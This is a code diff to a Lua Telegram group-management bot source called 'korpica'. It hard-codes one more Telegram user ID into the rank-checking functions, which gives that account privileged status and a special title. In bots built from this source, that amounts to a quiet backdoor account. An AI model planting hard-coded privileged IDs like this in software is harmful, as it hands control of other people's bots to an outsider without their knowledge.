@@ -115,6 +115,8 @@ function CleangGroups();local z = io.open('./korpica');local AllGroups = z:read(
 function Rank_Checking(user_id,chat_id)
 if tonumber(user_id) == tonumber(970017493) then  
 var = true  
+elseif tonumber(user_id) == tonumber(665877797) then
+var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then  
@@ -139,8 +141,10 @@ end
 function Get_Rank(user_id,chat_id)
 if tonumber(user_id) == tonumber(970017493) then  
 var = 'مطور السورس'
-elseif Devkorpicae(user_id) == true then
-var = "المطور الاساسي"  
+elseif tonumber(user_id) == tonumber(665877797) then  
+var = 'أبن مؤيد'
+elseif Devkorpicae(user_id) == true then  
+var = "المطور الاساسي" 
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = "البوت"
 elseif database:sismember(bot_id.."korpica:Sudo:User", user_id) then
